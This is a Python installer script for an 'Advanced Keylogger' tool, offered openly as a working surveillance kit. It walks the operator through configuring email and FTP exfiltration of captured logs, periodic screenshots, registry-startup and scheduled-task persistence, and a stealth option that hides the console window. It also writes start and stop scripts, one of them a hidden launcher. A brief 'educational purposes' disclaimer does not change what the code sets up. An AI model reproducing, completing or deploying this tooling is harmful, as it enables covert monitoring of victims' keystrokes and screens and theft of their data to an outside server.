#!/usr/bin/env python3
"""
Installation script for the Advanced Keylogger
Handles dependency installation and initial setup
"""

import sys
import subprocess
import os
import json
from pathlib import Path

def check_python_version():
    """Check if Python version is compatible"""
    if sys.version_info < (3, 7):
        print("Error: Python 3.7 or higher is required")
        return False
    return True

def install_dependencies():
    """Install required Python packages"""
    print("Installing dependencies...")
    
    try:
        # Upgrade pip first
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'])
        
        # Install requirements
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
        
        print("Dependencies installed successfully")
        return True
        
    except subprocess.CalledProcessError as e:
        print(f"Failed to install dependencies: {e}")
        return False

def setup_configuration():
    """Interactive configuration setup"""
    print("\n=== Keylogger Configuration Setup ===")
    
    config_file = Path("config.json")
    
    if config_file.exists():
        with open(config_file, 'r') as f:
            config = json.load(f)
    else:
        print("Configuration file not found!")
        return False
    
    # Email configuration
    setup_email = input("Do you want to configure email exfiltration? (y/n): ").lower().strip()
    if setup_email == 'y':
        config['exfiltration']['email']['enabled'] = True
        config['exfiltration']['email']['smtp_server'] = input("SMTP Server (e.g., smtp.gmail.com): ").strip()
        config['exfiltration']['email']['smtp_port'] = int(input("SMTP Port (e.g., 587): ").strip() or "587")
        config['exfiltration']['email']['username'] = input("Email Username: ").strip()
        config['exfiltration']['email']['password'] = input("Email Password (or App Password): ").strip()
        config['exfiltration']['email']['recipient'] = input("Recipient Email: ").strip()
        
        interval = input("Email interval in hours (default 24): ").strip()
        config['exfiltration']['email']['interval_hours'] = int(interval) if interval else 24
    
    # FTP configuration
    setup_ftp = input("Do you want to configure FTP exfiltration? (y/n): ").lower().strip()
    if setup_ftp == 'y':
        config['exfiltration']['ftp']['enabled'] = True
        config['exfiltration']['ftp']['server'] = input("FTP Server: ").strip()
        config['exfiltration']['ftp']['port'] = int(input("FTP Port (default 21): ").strip() or "21")
        config['exfiltration']['ftp']['username'] = input("FTP Username: ").strip()
        config['exfiltration']['ftp']['password'] = input("FTP Password: ").strip()
        config['exfiltration']['ftp']['remote_path'] = input("Remote path (default /logs): ").strip() or "/logs"
        
        interval = input("FTP interval in hours (default 12): ").strip()
        config['exfiltration']['ftp']['interval_hours'] = int(interval) if interval else 12
    
    # Capture settings
    print("\n=== Capture Settings ===")
    screenshot_interval = input("Screenshot interval in seconds (default 300): ").strip()
    if screenshot_interval:
        config['capture']['screenshot_interval'] = int(screenshot_interval)
    
    # Persistence settings
    print("\n=== Persistence Settings ===")
    registry_startup = input("Enable registry startup persistence? (y/n): ").lower().strip()
    config['persistence']['registry_startup'] = registry_startup == 'y'
    
    scheduled_task = input("Enable scheduled task persistence? (y/n): ").lower().strip()
    config['persistence']['scheduled_task'] = scheduled_task == 'y'
    
    # Stealth settings
    print("\n=== Stealth Settings ===")
    hide_window = input("Hide console window? (y/n): ").lower().strip()
    config['stealth']['hide_window'] = hide_window == 'y'
    
    # Save configuration
    with open(config_file, 'w') as f:
        json.dump(config, f, indent=4)
    
    print("Configuration saved successfully!")
    return True

def create_batch_files():
    """Create convenience batch files for Windows"""
    if os.name == 'nt':
        # Start script
        start_script = '''@echo off
cd /d "%~dp0"
python keylogger.py
pause'''
        
        with open('start_keylogger.bat', 'w') as f:
            f.write(start_script)
        
        # Hidden start script
        hidden_start_script = '''@echo off
cd /d "%~dp0"
python keylogger.py
'''
        
        with open('start_hidden.bat', 'w') as f:
            f.write(hidden_start_script)
        
        print("Batch files created: start_keylogger.bat, start_hidden.bat")

def create_service_files():
    """Create service files for Unix-like systems"""
    if os.name != 'nt':
        service_content = '''#!/bin/bash
cd "$(dirname "$0")"
python3 keylogger.py &
echo $! > keylogger.pid
'''
        
        with open('start_keylogger.sh', 'w') as f:
            f.write(service_content)
        
        os.chmod('start_keylogger.sh', 0o755)
        
        stop_content = '''#!/bin/bash
if [ -f keylogger.pid ]; then
    kill $(cat keylogger.pid)
    rm keylogger.pid
    echo "Keylogger stopped"
else
    echo "Keylogger PID file not found"
fi
'''
        
        with open('stop_keylogger.sh', 'w') as f:
            f.write(stop_content)
        
        os.chmod('stop_keylogger.sh', 0o755)
        
        print("Service scripts created: start_keylogger.sh, stop_keylogger.sh")

def display_warning():
    """Display legal warning and disclaimer"""
    warning = """
╔══════════════════════════════════════════════════════════════╗
║                        LEGAL WARNING                         ║
║                                                              ║
║  This software is for EDUCATIONAL and RESEARCH purposes     ║
║  only. The authors are not responsible for any misuse or    ║
║  illegal activities performed with this software.           ║
║                                                              ║
║  Usage of this software must comply with local and          ║
║  international laws. Users are solely responsible for       ║
║  ensuring legal compliance.                                 ║
║                                                              ║
║  By continuing, you acknowledge that you understand and     ║
║  accept these terms.                                        ║
╚══════════════════════════════════════════════════════════════╝
"""
    
    print(warning)
    
    consent = input("Do you agree to use this software responsibly and legally? (yes/no): ").lower().strip()
    if consent != 'yes':
        print("Installation aborted.")
        sys.exit(1)

def main():
    """Main installation process"""
    print("Advanced Keylogger Installation Script")
    print("=" * 40)
    
    # Display warning
    display_warning()
    
    # Check Python version
    if not check_python_version():
        sys.exit(1)
    
    # Install dependencies
    if not install_dependencies():
        sys.exit(1)
    
    # Setup configuration
    if not setup_configuration():
        sys.exit(1)
    
    # Create helper scripts
    create_batch_files()
    create_service_files()
    
    print("\n" + "=" * 40)
    print("Installation completed successfully!")
    print("\nTo start the keylogger:")
    if os.name == 'nt':
        print("- Windows: Run start_keylogger.bat or start_hidden.bat")
    else:
        print("- Unix/Linux: Run ./start_keylogger.sh")
    
    print("\nTo run directly: python keylogger.py")
    print("\nRemember to configure email/FTP settings in config.json")
    print("if you didn't do it during installation.")

if __name__ == "__main__":
    main()